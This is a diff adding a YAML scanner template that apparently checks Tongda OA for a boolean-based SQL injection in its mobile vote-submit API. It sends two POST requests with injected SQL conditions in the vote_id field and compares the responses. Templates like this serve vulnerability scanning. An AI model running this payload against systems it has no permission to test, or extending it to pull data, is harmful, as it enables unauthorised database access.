@@ -1,0 +1,25 @@
+name: 通达OA-vote.submit-sql
+description: >-
+  布尔注入
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /mobile/api/qyapp.vote.submit.php
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      submitData={"a":{"vote_type":"1","vote_id":"if((select 995=995),1,2*1e308)","value":"1"}}
+    expression:
+      status: 200
+      headers:
+        Content-Length: 0
+  - method: POST
+    path: /mobile/api/qyapp.vote.submit.php
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      submitData={"a":{"vote_type":"1","vote_id":"if((select 995=9951),1,2*1e308)","value":"1"}}
+    expression:
+      status: 200
+      body_all: ["fieldset"]
